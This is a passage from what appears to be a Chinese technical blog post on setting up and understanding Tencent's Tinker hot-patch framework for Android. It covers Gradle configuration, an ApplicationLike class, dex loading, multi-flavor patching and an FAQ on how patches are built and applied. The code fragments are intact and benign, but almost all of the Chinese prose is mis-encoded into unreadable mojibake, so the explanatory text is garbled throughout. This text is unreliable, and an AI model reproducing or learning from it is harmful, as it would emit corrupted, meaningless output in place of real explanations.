åˆ°æ­¤ï¼Œåœ¨æ²¡æœ‰é‡æ–°æ‰“åŒ…çš„æƒ…å†µä¸‹ï¼Œçƒ­ä¿®å¤å®Œæˆã€‚ 2. å·²æœ‰çš„é¡¹ç›®æ”¹é€ ç…§ç€æ”¹æˆè¿™æ ·åœ¨Gradle.propertiesé‡Œé¢æ·»åŠ  TINKER_VERSION = 1.9.1 //åªæ˜¯ä¸ºäº†é›†ä¸­ç®¡ç†TINKER_ID = 1.0 //è¿™ä¸ªä¸æ·»åŠ ä¼šæŠ¥é”™ projectçš„build.gradleä¸­æ·»åŠ  classpath â€œcom.tencent.tinker:tinker-patch-gradle-plugin:${TINKER_VERSION}â€ appçš„build.gradleä¸­éœ€è¦æ–°å¢å¾ˆå¤šä¸œè¥¿ï¼Œå»ºè®®ç›´æ¥å¤åˆ¶è¿‡æ¥ã€‚éœ€è¦æ”¹çš„åœ°æ–¹å°±æ˜¯ ext { tinkerOldApkPath = &quot;${bakPath}/app-debug-1118-15-50-07.apk&quot; // æ‰¾åˆ°å½“å‰app/build/bakApk/ç›®å½•ä¸‹çš„apkæ–‡ä»¶ï¼ŒæŠŠåå­—æ”¹æˆè‡ªå·±å’Œå½“å‰çš„æ–‡ä»¶ä¸€æ ·çš„ } ignoreWarning = true //é»˜è®¤æ˜¯falseï¼Œä¸æ”¹ç»å¸¸ç¼–è¯‘æŠ¥é”™ implementation(&quot;com.tencent.tinker:tinker-android-lib:${TINKER_VERSION}&quot;) { changing = true } provided(&quot;com.tencent.tinker:tinker-android-anno:${TINKER_VERSION}&quot;) annotationProcessor(&quot;com.tencent.tinker:tinker-android-anno:${TINKER_VERSION}&quot;) æ¥ä¸‹æ¥æ˜¯Applicationï¼Œå¦‚æœè‡ªå·±ç»§æ‰¿äº†android.app.Applicationçš„è¯ï¼Œå¾—æ”¹ä¸€ä¸‹ //åŸæ¥ public MyApplication extends Application{ } //ç°åœ¨ @SuppressWarnings(&quot;unused&quot;) @DefaultLifeCycle(application = &quot;com.åŒ…å.SomeName&quot;, flags = ShareConstants.TINKER_ENABLE_ALL, loadVerifyFlag = false) public class AppLike extends DefaultApplicationLike { static Context context; public AppLike(Application application, int tinkerFlags, boolean tinkerLoadVerifyFlag, long applicationStartElapsedTime, long applicationStartMillisTime, Intent tinkerResultIntent) { super(application, tinkerFlags, tinkerLoadVerifyFlag, applicationStartElapsedTime, applicationStartMillisTime, tinkerResultIntent); } /** * install multiDex before install tinker * so we don&#39;t need to put the tinker lib classes in the main dex * * @param base */ @TargetApi(Build.VERSION_CODES.ICE_CREAM_SANDWICH) @Override public void onBaseContextAttached(Context base) { super.onBaseContextAttached(base); //you must install multiDex whatever tinker is installed! MultiDex.install(base); AppLike.context = getApplication(); //åˆå§‹åŒ–Tinker TinkerInstaller.install(this); } @TargetApi(Build.VERSION_CODES.ICE_CREAM_SANDWICH) public void registerActivityLifecycleCallbacks(Application.ActivityLifecycleCallbacks callback) { getApplication().registerActivityLifecycleCallbacks(callback); } public static Context getContext() { return context; } } Mainfesté‡Œé¢è¦æ”¹æˆä¸Šé¢é‚£ä¸ªâ€œcom.åŒ…å.SomeNameâ€ æ¥ä¸‹æ¥æŒ‰ç…§ä¹‹å‰çš„æ­¥éª¤å°±Okäº†ã€‚ 3. Configurationä»¥ä¸Šåªæ˜¯ç®€å•çš„æŠŠDemoè·‘é€šï¼Œæ¥ä¸‹é‡Œéœ€è¦çœ‹ä¸‹Tinkeræä¾›çš„å®šåˆ¶é¡¹ ======================================================================= 4. å¸¸è§é—®é¢˜Q: æˆ‘åªä¸è¿‡æ”¹äº†ä¸€ä¸ªToastçš„æ–‡æ¡ˆï¼Œä¸ºæ¯›ç”Ÿæˆçš„patch_signed_7zip.apkæ–‡ä»¶è¿™ä¹ˆå¤§()ï¼ŸA: çœ‹ä¸‹tinkerPatchæ–‡ä»¶å¤¹ä¸‹é¢çš„log.txtæ–‡ä»¶ï¼ˆå»ºè®®ç”¨Notepadæ‰“å¼€ï¼‰ï¼Œé‡Œé¢ä¸€å¤§å †â€œFound add resource: res/drawable-hdpi-v4/abc_list_pressed_holo_light.9.pngâ€è¿™æ ·çš„ç±»ä¼¼çš„å‡ºç°ï¼Œå…·ä½“åŸå› è·Ÿaaptæœ‰å…³ï¼Œå¥½åƒå¯ä»¥è®¾ç½®detect resource change ï¼ˆå¤§æ¦‚å°±è¿™æ„æ€ï¼‰ä¸ºfalseï¼Œè¿™æ ·å°±ä¸ä¼šé‚£ä¹ˆå¤§äº†ã€‚ Q: Tinker-PatchæŠŠè¡¥ä¸æ–‡ä»¶æ”¾åœ¨ä»€ä¹ˆä½ç½®A: å› ä¸ºæ¥æ”¶è¡¥ä¸çš„ä»£ç å°±åœ¨TinkerInstaller.onReceiveUpgradePatchè¿™ä¸€æ®µäº†ã€‚åœ¨UpgradePatchRetry.javaä¸­ï¼Œæœ‰è¿™ä¹ˆä¸€æ®µï¼štempPatchFile = new File(SharePatchFileUtil.getPatchTempDirectory(context), TEMP_PATCH_NAME); ï¼ˆ/data/data/com.example.myApp/data/tinker_temp/temp.apkï¼‰ã€‚å½“ç„¶è¿˜æœ‰å…¶ä»–çš„ï¼Œæ€»ä¹‹å°±æ˜¯æ”¾åœ¨å½“å‰åº”ç”¨dataæ–‡ä»¶å¤¹ä¸‹é¢çš„tinkeræˆ–è€…tinker_tempæ–‡ä»¶å¤¹ä¸‹ã€‚ Q: TinkerPatchå’ŒTinkerä»€ä¹ˆå…³ç³»Aï¼šTinkerPatchçš„SDKé‡Œé¢åŒ…å«äº†Tinkerå¿…è¦çš„åŠŸèƒ½ï¼Œå¼€å‘è€…åªéœ€è¦æ·»åŠ TinkerPatchè¿™ä¸€æ¡ä¾èµ–ï¼Œä¹Ÿä¸éœ€è¦å»ç»§æ‰¿ApplicationLikeè¿™äº›ä¸œè¥¿äº†ï¼Œå¼€å‘è€…ä¸ç”¨è‡ªå·±å¼€ä¸€ä¸ªä¸‹è½½æœåŠ¡å»ä¸‹å‘patch_signed_7zip.apkè¿™ä¸ªæ–‡ä»¶äº†ï¼ŒonReceiveUpgradePatchè¿™äº›äº‹ä¹Ÿåšå¥½äº†ã€‚ç¡®å®æ˜¯æ¥å…¥æˆæœ¬æœ€ä½çš„æ–¹æ¡ˆï¼Œæ­å»ºåå°å‡å¦‚äº¤ç”±è‡ªå·±å…¬å¸çš„APIå›¢é˜Ÿå¤„ç†ï¼Œèµ·ç å¾—å¥½å‡ å¤©ï¼Œè¿˜å¾—è€½è¯¯äº§å“æ­£å¸¸çš„å¼€å‘èŠ‚å¥ã€‚è€ŒTinkerPatchç»™å‡ºçš„æŠ¥ä»·æ˜¯399å…ƒ/æœˆã€‚çŸ­æœŸæ¥çœ‹ï¼Œæ˜¾ç„¶å‰è€…çš„æˆæœ¬è¦é«˜å‡ºä¸å°‘ï¼Œè¿˜å¾—é¡¾è™‘è‡ªå®¶å›¢é˜Ÿç»´æŠ¤çš„ä»£ä»·ã€‚ç®—ä¸€ç¬”ç»æµè´¦çš„è¯ï¼Œæ˜¾ç„¶ä¼ä¸šå€¾å‘äºèŠ±é’±ä¹°ç¨³å®šæœåŠ¡ã€‚å¯¹äºä¸ªäººæ¥è®²ï¼Œç›®å‰æœ‰å…è´¹ç‰ˆå¯ä»¥ä½¿ç”¨ï¼Œä¼°è®¡ä¹Ÿæ˜¯ä¸ºäº†ç»™æµ‹è¯•Demoä½¿ç”¨çš„ï¼Œæƒ³ç©ç®€å•ç‰ˆçš„è¯å¯ä»¥è¯•è¯•ã€‚ Q: å¦‚ä½•æ›´æ¢Dexçš„A: å¼•ç”¨Androidçƒ­è¡¥ä¸ä¹‹TinkeråŸç†è§£æä¸­çš„è¯ï¼šâ€œç”±äºTinkerçš„æ–¹æ¡ˆæ˜¯åŸºäºMultidexå®ç°çš„ä¿®æ”¹dexElementsçš„é¡ºåºå®ç°çš„ï¼Œæ‰€ä»¥æœ€ç»ˆè¿˜æ˜¯è¦ä¿®æ”¹classLoderä¸­dexPathListä¸­dexElementsçš„é¡ºåºã€‚Androidä¸­æœ‰ä¸¤ç§ClassLoaderç”¨äºåŠ è½½dexæ–‡ä»¶ï¼ŒBootClassLoaderã€PathClassLoaderå’ŒDexClassLoaderéƒ½æ˜¯ç»§æ‰¿è‡ªBaseDexClassLoaderã€‚æœ€ç»ˆåœ¨DexPathListçš„findClassä¸­éå†dexElementsï¼Œè°åœ¨å‰é¢ç”¨è°ã€‚â€ã€‚æ‰€ä»¥å…¶å®å°±æ˜¯æ ¹æ®ä¸‹å‘çš„è¡¥ä¸æ–‡ä»¶ï¼ŒæŠŠdexæ–‡ä»¶ç»™ä¿®æ”¹äº†ï¼Œè¿™ä¸€ç‚¹è·ŸMultiDexå¾ˆåƒã€‚æ›´æ–°ä¸€ä¸‹ï¼Œä½ç‰ˆæœ¬æ˜¯dexpathListå‰ç½®ï¼Œé«˜ç‰ˆæœ¬åˆ™ç›´æ¥åˆ›å»ºclassLoader Q: Dexæ–‡ä»¶æ ¼å¼Aï¼š The Dex File Formatã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œè¿™ç¯‡æ–‡ç« æåˆ°äº†æ–‡ä»¶å¤´ï¼Œdexçš„å¤´æ˜¯ 6465780A 30333800dex038 è¿™ä¸ªæ˜¯hexoDecimalï¼Œåå…­è¿›åˆ¶2ä¸ªæ•°å­—ï¼ˆå­—æ¯ï¼‰ä»£è¡¨ä¸€ä¸ªbyte(2*8bits = 2 bytes)ï¼ŒæŒ‰ç…§äºŒè¿›åˆ¶0101çš„æ–¹å¼æ¥çœ‹çš„è¯å°±æ˜¯ï¼š 6465ï¼ˆ0110 0100 0110 0101ï¼‰ 780A(0111 1000 0000 1010)ã€‚å…³äºdex formatçš„æ›´å¤šçš„åˆ†æ Q: broken.apk + patch_signed_7zip = fixed apkçš„è¿‡ç¨‹A: åœ¨UpgradePatch.tryPath -&gt; DexDiffPatchInternal.tryRecoverDexFiles -&gt; dexOptimizeDexFiles -&gt; TinkerDexOptimizer.optimizeAll -&gt;OptimizeWorker.run -&gt; DexFile.loadDex(DexFileæ˜¯dalvik.systemåŒ…ä¸‹çš„)ã€‚ è¿™äº›éƒ½æ˜¯åœ¨patchè¿›ç¨‹è¿è¡Œçš„ Qï¼š æŠŠTinkerå¯¼å…¥Intelijä¸­Aï¼š Intelijä¸­open project -&gt; é€‰æ‹© tinker-build/tinker-build.iml å³å¯ã€‚é¡ºå¸¦ç€å…¶ä»–çš„muduleéƒ½èƒ½æŸ¥çœ‹äº†ã€‚æœ€å¥½åœ¨tinker-sample-android/app/build.gradleæ–‡ä»¶ä¸­æ³¨é‡Šæ‰è¿™ä¸¤å¥è¯ // annotationProcessor(â€œcom.tencent.tinker:tinker-android-anno:${TINKER_VERSION}â€) { changing = true }// compileOnly(â€œcom.tencent.tinker:tinker-android-anno:${TINKER_VERSION}â€) { changing = true } Q: å…³äºBSDiffAï¼šwindowsä¸‹å¯ä»¥ç›´æ¥ä¸‹è½½å¯¹åº”çš„exe ,cmdä¸­æ‰§è¡Œ bsdiff old.apk new.apk old-to-new.patchbspatch old.apk new2.apk old-to-new.patch Q: patchè¿›ç¨‹æ˜¯å¦‚ä½•å’Œä¸šåŠ¡è¿›ç¨‹äº¤äº’çš„Aï¼š tinker-android/tinker-android-lib/src/main/AndroidManifest.xmlä¸­æ˜ç¡®æŒ‡æ˜äº†æ‰“è¡¥ä¸æ˜¯åœ¨ä¸€ä¸ªyoupackagename:patchçš„è¿›ç¨‹ä¸­å»æ“ä½œçš„ã€‚è¿™æ ·åšä¹Ÿæ˜¯ä¸ºäº†å‡å°‘å¯¹äºä¸»ä¸šåŠ¡çš„å½±å“ã€‚è·¨è¿›ç¨‹äº¤äº’å¹¶æ²¡æœ‰å†™aidlï¼Œå…¶å®åªæ˜¯èµ·äº†ä¸€ä¸ªIntentServiceé€šçŸ¥ä¸»ä¸šåŠ¡è¿›ç¨‹ã€‚ Q: å…³äºCLASS_ISPREVERIFIEDè¿™ä¸ªå…³é”®è¯Aï¼šdexElementsæ•°ç»„æ›´æ¢ä¹‹åå°±å®Œäº‹äº†ï¼Ÿå…¶å®è¿˜å·®ä¸€ä¸ªç±»çš„æ ¡éªŒã€‚è¿™é‡Œä¸æ˜¯è¯´classLoaderçš„æ ¡éªŒï¼ˆè¿™ä¸ªå¥½åƒæœ‰äº”ä¸ªæ­¥éª¤ï¼‰ï¼Œè¿™ç¯‡æ–‡ç« æåˆ°äº† Q: å¤šæ¸ é“è¦ä¸è¦æ‰“å¤šä¸ªåŒ…å•ŠA: å¦‚æœæ˜¯ä½¿ç”¨productFlavorè¿™ç§å®˜æ–¹æ–¹å¼æ‰“å‡ºæ¥çš„å¤šæ¸ é“åŒ…ï¼Œç¡®å®éœ€è¦æ‰“å¤šä¸ªè¡¥ä¸ï¼Œè¿™ä¸ªgradle taskçš„åå­—å«åšbuildAllFlavorsTinkerPatchRelease(ç›¸å½“é•¿)buglyå›¢é˜Ÿçš„è§£é‡Šï¼Œå› ä¸º public final class BuildConfig { public static final boolean DEBUG = Boolean.parseBoolean(&quot;true&quot;); public static final String APPLICATION_ID = &quot;com.example.application&quot;; public static final String BUILD_TYPE = &quot;debug&quot;; public static final String FLAVOR = &quot;&quot;; public static final int VERSION_CODE = 1; public static final String VERSION_NAME = &quot;1.0&quot;; } ä¸åŒçš„æ¸ é“åŒ…çš„BuildConfigè¿™ä¸ªclassæ–‡ä»¶çš„flavorè¿™ä¸ªå€¼å°±ä¸ä¸€æ ·äº†ï¼Œæ‰€ä»¥æœ€åçš„dexæ–‡ä»¶éƒ½ä¸ä¸€æ ·äº†ã€‚æ‰€ä»¥æ›´å¥½çš„æ–¹å¼æ˜¯ä½¿ç”¨ç¾å›¢çš„walle(å¾€APK Signature Blockè¿™é‡Œæ·»åŠ ID-Value),èƒ½å¤Ÿè¿™ä¹ˆåšçš„åŸå› ä»…ä»…æ˜¯googleç›®å‰è¿˜æ²¡å¯¹è¿™å—é™åˆ¶ï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œå¯ä»¥å½“åšä¸€ä¸ªè‡ªå®šä¹‰çš„key-valueå­˜å‚¨blockã€‚å› ä¸ºè¿™ç§æ–¹å¼æ²¡æœ‰ç¢°dexï¼Œæ‰€ä»¥å°±å¯ä»¥ä¸€ä¸ªè¡¥ä¸ä¿®å¤æ‰€æœ‰æ¸ é“äº†ï¼ˆåœ¨bakApkæ–‡ä»¶å¤¹ä¸‹é¢ä¸æ˜¯æœ‰åŸºå‡†åŒ…å˜›ï¼‰ åœ¨apkå®‰è£…çš„æ—¶å€™ç³»ç»Ÿä¼šå°†dexæ–‡ä»¶ä¼˜åŒ–æˆodexæ–‡ä»¶ï¼Œåœ¨ä¼˜åŒ–çš„è¿‡ç¨‹ä¸­ä¼šæ¶‰åŠä¸€ä¸ªé¢„æ ¡éªŒçš„è¿‡ç¨‹å¦‚æœä¸€ä¸ªç±»çš„staticæ–¹æ³•ï¼Œprivateæ–¹æ³•ï¼Œoverrideæ–¹æ³•ä»¥åŠæ„é€ å‡½æ•°ä¸­å¼•ç”¨äº†å…¶ä»–ç±»ï¼Œè€Œä¸”è¿™äº›ç±»éƒ½å±äºåŒä¸€ä¸ªdexæ–‡ä»¶ï¼Œæ­¤æ—¶è¯¥ç±»å°±ä¼šè¢«æ‰“ä¸ŠCLASS_ISPREVERIFIEDå¦‚æœåœ¨è¿è¡Œæ—¶è¢«æ‰“ä¸ŠCLASS_ISPREVERIFIEDçš„ç±»å¼•ç”¨äº†å…¶ä»–dexçš„ç±»ï¼Œå°±ä¼šæŠ¥é”™æ‰€ä»¥MainActivityçš„onCreate()æ–¹æ³•ä¸­å¼•ç”¨å¦ä¸€ä¸ªdexçš„ç±»å°±ä¼šå‡ºç°ä¸Šæ–‡ä¸­çš„é—®é¢˜æ­£å¸¸çš„åˆ†åŒ…æ–¹æ¡ˆä¼šä¿è¯ç›¸å…³ç±»è¢«æ‰“å…¥åŒä¸€ä¸ªdexæ–‡ä»¶æƒ³è¦ä½¿å¾—patchå¯ä»¥è¢«æ­£å¸¸åŠ è½½ï¼Œå°±å¿…é¡»ä¿è¯ç±»ä¸ä¼šè¢«æ‰“ä¸ŠCLASS_ISPREVERIFIEDæ ‡è®°ã€‚è€Œè¦å®ç°è¿™ä¸ªç›®çš„å°±å¿…é¡»è¦åœ¨åˆ†å®ŒåŒ…åçš„classä¸­æ¤å…¥å¯¹å…¶ä»–dexæ–‡ä»¶ä¸­ç±»çš„å¼•ç”¨ã€‚å¦‚æœAç±»å¼•ç”¨äº†Cç±»ï¼ŒCç±»åœ¨å…¶ä»–Dexä¸­ï¼Œé‚£ä¹ˆå°±å¯ä»¥é¿å…Aç±»è¢«æ‰“ä¸Šæ ‡è®°ã€‚åªè¦åœ¨staticæ–¹æ³•ï¼Œæ„é€ æ–¹æ³•ï¼Œprivateæ–¹æ³•ï¼ŒOverrideæ–¹æ³•ä¸­ç›´æ¥é¥®ç”¨äº†å…¶ä»–dexä¸­çš„ç±»ï¼Œè¿™ä¸ªç±»å°±ä¸ä¼šè¢«æ‰“ä¸ŠCLASS_ISPREVERIFIEDçš„æ ‡è®°ã€‚è¦åœ¨å·²ç»ç¼–è¯‘å®Œæˆåçš„ç±»ä¸­æ¤å…¥å¯¹å…¶ä»–ç±»çš„å¼•ç”¨ï¼Œå°±éœ€è¦æ“ä½œå­—èŠ‚ç ï¼Œæƒ¯ç”¨çš„æ–¹æ¡ˆæ˜¯æ’æ¡©ã€‚å¸¸è§çš„å·¥å…·æœ‰javaassistï¼Œasmç­‰ã€‚ æ‰€ä»¥QQç©ºé—´ç»™å‡ºçš„æ–¹æ¡ˆæ˜¯åœ¨æ‰€æœ‰classçš„æ„é€ å‡½æ•°ä¸­æ·»åŠ ä¸€è¡Œprintln(C.class)æ–¹æ³•ï¼Œç›´æ¥å¼•ç”¨å¦ä¸€ä¸ªdexåŒ…ä¸­çš„ç±»ã€‚è¿™ä¸ªæ·»åŠ çš„è¿‡ç¨‹ç”¨javaAssistè¿™ç§æ“ä½œå­—èŠ‚ç çš„æ–¹å¼å°±å¯ä»¥ç®€å•å®ç° Androidçƒ­è¡¥ä¸åŠ¨æ€ä¿®å¤æŠ€æœ¯è¿™ä¸€ç³»åˆ—æ–‡ç« ä»‹ç»äº†ä½¿ç”¨gradle apiå¯¹ç¼–è¯‘è¿‡ç¨‹è¿›è¡Œhookï¼Œå®ç°è‡ªåŠ¨åŒ–è¡¥ä¸æ“ä½œçš„è¿‡ç¨‹ Q: Tinkeræ˜¯å¦‚ä½•ä½¿ç”¨gradleæ’ä»¶ç”Ÿæˆdexè¡¥ä¸çš„?A: å‚è€ƒé¸¿æ´‹è¿™ç¯‡æ–‡ç«  æ‰“è¡¥ä¸çš„æ—¶å€™æ‰§è¡Œçš„æ˜¯tinkerPatchDebugè¿™ä¸ªä»»åŠ¡ï¼Œæ‰§è¡Œè¿™ä¸ªä»»åŠ¡å‘ç°ä¾æ¬¡æ‰§è¡Œäº†è¿™äº›ä»»åŠ¡ :app:processDebugManifest:app:tinkerProcessDebugManifestï¼ˆtinkerï¼‰:app:tinkerProcessDebugResourceId (tinker):app:processDebugResources:app:tinkerProguardConfigTask(tinker):app:transformClassesAndResourcesWithProguard:app:tinkerProcessDebugMultidexKeep (tinker):app:transformClassesWidthMultidexlistForDebug:app:assembleDebug:app:tinkerPatchDebug(tinker) 1.TinkerManifestTaskï¼Œç”¨äºæ·»åŠ TINKER_IDï¼›2.TinkerResourceIdTaskï¼Œä½¿ç”¨aaptçš„public.xmlå’Œids.xmlæ¥ç®¡äº†èµ„æºidçš„ç”Ÿæˆ.é¦–å…ˆåœ¨æ‰“è€çš„apkåŒ…çš„æ—¶å€™ä¼šé…ç½®ä¸€ä¸ªtinkerApplyResourcePathï¼Œå¯¹åº”çš„æ˜¯ç”Ÿæˆçš„R.txtçš„è·¯å¾„ã€‚æ¥ä¸‹æ¥æ¯”è¾ƒresæ–‡ä»¶å¤¹ä¸­å„ç§èµ„æºï¼Œå¯¹æ¯”ç”Ÿæˆpublic.xml3.TinkerProguardConfigTaskã€‚å› ä¸ºproguardçš„å­˜åœ¨ï¼Œä¸¤æ¬¡æ‰“å‡ºæ¥çš„ä»£ç æ··æ·†å·®å¼‚éå¸¸å¤§ï¼Œproguardæœ‰ä¸€ä¸ª-applymappingé€‰é¡¹ï¼Œç”¨äºé™å®šä¸¤æ¬¡æ··æ·†ä½¿ç”¨åŒä¸€ä»½æ··æ·†è§„åˆ™ã€‚è¿˜æœ‰com.tencent.tinker.loader.**è¿™äº›æ˜¯ä¸èƒ½æ··æ·†çš„ã€‚ TinkerMultidexConfigTaskã€‚è¿™é‡Œè¦ç¡®ä¿applicationã€com.tencent.tinker.loader.**è¿™äº›åœ¨ä¸»dexä¸­ TinkerPatchSchemaTaskï¼Œç”Ÿæˆpatchï¼Œç”Ÿæˆmeta-fileå’Œversion-fileï¼Œbuild patchè¿™é‡Œå°±æ˜¯å¯¹ä¸¤ä¸ªapkè¿›è¡Œäº†æ¯”è¾ƒï¼šold apk: build/intermediates/outputs/old apkåç§°/new apk: build/intermediates/outputs/app-debug/dexFile -&gt; dexDecoder.patch é¦–å…ˆå°†ä¸¤ä¸ªdexè¯»å–åˆ°å†…å­˜ä¸­ï¼Œå¦‚æœoldFileä¸å­˜åœ¨ï¼Œåˆ™newFileè®¤ä¸ºæ˜¯æ–°å¢æ–‡ä»¶ï¼Œç›´æ¥copyåˆ°è¾“å‡ºç›®å½•ï¼Œå¹¶è®°å½•logã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™è®¡ç®—ä¸¤ä¸ªæ–‡ä»¶çš„md5ï¼Œå¦‚æœmd5ä¸åŒï¼Œåˆ™è®¤ä¸ºdexChanged(hasDexChanged = true)ï¼Œæ‰§è¡Œï¼šcollectAddedOrDeletedClasses(oldFile, newFile);è¯¥æ–¹æ³•æ”¶é›†äº†addClasseså’ŒdeleteClassesçš„ç›¸å…³ä¿¡æ¯ã€‚ä»…å°†æ–°å¢çš„æ–‡ä»¶copyåˆ°äº†ç›®æ ‡ç›®å½•ã€‚å‘ç”Ÿæ”¹å˜çš„æ–‡ä»¶ï¼Œåé¢ä¼šæ‰§è¡ŒdiffDexPairAndFillRelatedInfoï¼Œç”Ÿæˆçš„patchæ–‡ä»¶æ”¾åˆ°äº†outputs/tempPatchedDexesæ–‡ä»¶å¤¹é‡Œã€‚patchå®Œäº†ä¹‹åè¿˜æ¨¡æ‹Ÿåšäº†ä¸€æ¬¡åˆå¹¶ï¼Œçœ‹ä¸‹old dexæ‰“å®Œpatchæ˜¯ä¸æ˜¯å’Œæ–°çš„dexçš„md5ç›¸åŒã€‚soFile -&gt; soDecoder.patch å®Œæˆsoæ–‡ä»¶çš„æ¯”å¯¹,æ–°æ–‡ä»¶çš„è¯ç›´æ¥å¤åˆ¶ï¼Œå¦åˆ™æ¯”è¾ƒmd5ï¼Œè¶…è¿‡80%åˆ™ç›´æ¥copyæ–°æ–‡ä»¶è‡³ç›®æ ‡æ–‡ä»¶å¤¹,ä¸è¶…è¿‡æ–°æ–‡ä»¶çš„80%ï¼Œåˆ™copy patchæ–‡ä»¶è‡³ç›®æ ‡æ–‡ä»¶å¤¹ï¼Œè®°å½•logresFile -&gt; resDecoder.patch å®Œæˆresæ–‡ä»¶çš„æ¯”å¯¹ Q: æ”¶åˆ°ä¸‹å‘çš„è¡¥ä¸åæ˜¯å¦‚ä½•åˆæˆçš„ï¼Œåˆæˆå¥½äº†æ”¾åœ¨å“ªäº†A: é¦–å…ˆï¼Œåˆæˆæ˜¯åœ¨patchè¿›ç¨‹è·‘çš„ï¼Œå…³é”®æ–¹æ³•æ˜¯DexDiffPatchInternal.patchDexExtractViaDexDiffï¼Œè¿™é‡Œé¢åšäº†ä¸¤ä»¶æ˜¯ï¼Œä¸€ä¸ªæ˜¯åˆæˆæ–°çš„dexæ–‡ä»¶ï¼ˆextractDexDiffInternalsï¼‰ï¼Œå¦ä¸€ä¸ªæ˜¯æ‰‹åŠ¨è°ƒç”¨DexFile.loadDexå»è§¦å‘dexoatæµç¨‹(dexOptimizeDexFiles) æ–‡ä»¶å†™åˆ°äº†/data/data/com.example.application/tinker/patch1.1/Dex/classes1.dex //è¿™é‡Œè¿™ä¸ªclasses1.dexæˆ‘ä¸ç¡®å®šï¼Œpatch1.1æ˜¯è¡¥ä¸ç‰ˆæœ¬å·ã€‚è¿™é‡Œé¢å°±æ˜¯å†™å¾€ä¸€ä¸ªZipOutputStream.ç„¶åé‡å¯ï¼Œæ³¨æ„è¿™é‡Œæ˜¯ä¸»è¿›ç¨‹å’¯ï¼Œå¼€å§‹åŠ è½½è¿™ä¸ªå†™å¥½çš„æ–‡ä»¶ï¼Œåœ¨TinkerDexLoader.loadTinkerJarä¸­ï¼Œä¹Ÿæ˜¯å»/data/data/com.example.application/tinker/patch1.1/Dex/è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹é¢æ‰¾æ–‡ä»¶ï¼Œç„¶ååŠ å…¥åˆ°ä¸€ä¸ªlegalFilesçš„listä¸­ï¼Œè°ƒç”¨SystemClassLoaderAdder.installDexesï¼ˆä¹Ÿå°±æ˜¯DexPathListé‚£ä¸€å¥—ï¼‰ å¥½çš„å­¦ä¹ èµ„æ–™Tinkerå­¦ä¹ è®¡åˆ’(2)-Tinkerçš„åŸç†ä¸€Android åŸºäºgradleæ’ä»¶å®ç°å¤šæ¸ é“æ‰“åŒ…åŠ å¿«apkçš„æ„å»ºé€Ÿåº¦ï¼Œå¦‚ä½•æŠŠç¼–è¯‘æ—¶é—´ä»130ç§’é™åˆ°17ç§’fastdexmultiple-apk-generator 5. æºç è§£æè‡³å°‘æˆ‘ç°åœ¨çœ‹åˆ°7ä¸ªåŒ…ï¼š com.tencent.tinker:aosp-dexutils:1.91.@jarcom.tencent.tinker:bsdiff-util:1.91.@jarcom.tencent.tinker:tinker-android-anno:1.91.@jarcom.tencent.tinker:tinker-android-lib:1.91.@jarcom.tencent.tinker:tinker-android-loader:1.91.@jarcom.tencent.tinker:tinker-commons:1.91.@jarcom.tencent.tinker:tinker-ziputils:1.91.@jar åˆ†çš„è¿™ä¹ˆæ•£ä¼°è®¡ä¹Ÿæ˜¯å¸Œæœ›èƒ½å¤Ÿå¥½æ‰©å±•å§ã€‚æ¢dexæ–‡ä»¶çš„å…³é”®æ–¹æ³•åœ¨DexPathList.findClassè¿™ä¸ªæ–¹æ³•é‡Œé¢ã€‚å‚è€ƒ ç½‘ä¸Šå…³äºæºç è§£æçš„æ–‡ç« å·²ç»å¾ˆå¤šï¼Œå°±æ˜¯è¦è€ƒè™‘çš„ç‚¹ç‰¹åˆ«å¤šã€‚ çœ‹ä¸€ä¸‹å®˜æ–¹Tinkeré¡¹ç›®ä¸­çš„æ–‡ä»¶å¤¹ï¼Œæœ‰ä¸€ä¸ªtinker-buildï¼Œé‡Œé¢æœ‰ä¸¤ä¸ªpythonæ–‡ä»¶ï¼Œè¿™å°±å¾ˆæœ‰æ„æ€äº†ã€‚å†çœ‹çœ‹tinker-patch-gradle-pluginï¼Œé‡Œé¢ä¸€å¤§å †groovyæ–‡ä»¶ï¼Œæ‰€ä»¥çœ‹æ‡‚è¿™ä¸ªå¯¹äºgradleæ’ä»¶å¼€å‘æ˜¯æœ‰å¥½å¤„çš„ã€‚ ç›®å‰åœ¨1.9.1ç‰ˆæœ¬é‡Œé¢å¥½åƒçœ‹åˆ°äº†ä¸€ä¸ªtinkerFastCrashProtectï¼Œçœ‹æ¥ä¹Ÿæ˜¯è·Ÿé£å¤©çŒ«å¿«é€Ÿä¿®å¤å¯åŠ¨ä¿æŠ¤é‚£ä¸€å¥—ã€‚å…³äºTinker-Patchè¿™ä¸ªå¤–åŒ…ç»™ç¬¬ä¸‰æ–¹çš„æœåŠ¡ï¼Œçº¯å±å¥½å¥‡å°±å»çœ‹äº†ä¸‹urlåˆ°åº•é•¿ä»€ä¹ˆæ ·ã€‚åœ¨TinkerClientAPIé‡Œé¢æœ‰è¿™ä¹ˆä¸€æ®µï¼Œå…¶å®è·ŸTinkeræœ¬èº«åºå¤§çš„æ¶æ„æ¯”èµ·æ¥ï¼Œå·²ç»ç®—ä¸ä¸Šä»€ä¹ˆäº†ã€‚ Uri.Builder urlBuilder = Uri.parse(this.host).buildUpon(); // &quot;http://q.tinkerpatch.com&quot; if (clientAPI.debug) { urlBuilder.appendPath(&quot;dev&quot;); } final String url = urlBuilder.appendPath(this.appKey) .appendPath(this.appVersion) .appendQueryParameter(&quot;d&quot;, versionUtils.id()) .appendQueryParameter(&quot;v&quot;, String.valueOf(System.currentTimeMillis())) .build().toString(); é™¤æ­¤ä¹‹å¤–ï¼Œä¸ºäº†èƒ½å¤Ÿåœ¨æµ‹è¯•ç¯å¢ƒéªŒè¯è¡¥ä¸ï¼Œè¿˜æä¾›äº†ä¸€ä¸ªå°å·¥å…· å¾ˆæ„Ÿè°¢é¹…å‚èƒ½å¤Ÿå°†Tinkerè¿™æ ·çš„å·¥å…·å¼€æºå‡ºæ¥é€ ç¦å¹¿å¤§å¼€å‘è€…ï¼ŒæŠ›å¼€æŠ€æœ¯ä¸Šçš„å®åŠ›ä¸è¯´ï¼Œèƒ½å¤Ÿä¸€ç›´ç§¯æç»´æŠ¤ä¹Ÿæ˜¯ä¸€ä»¶äº†ä¸èµ·çš„äº‹æƒ…ã€‚ å‚è€ƒ å¾®ä¿¡çƒ­ä¿®å¤tinkeråŠtinker-serverå¿«é€Ÿæ¥å…¥ TinkerPatchï¼Œå…¶å®å°±æ˜¯å¸®ä½ 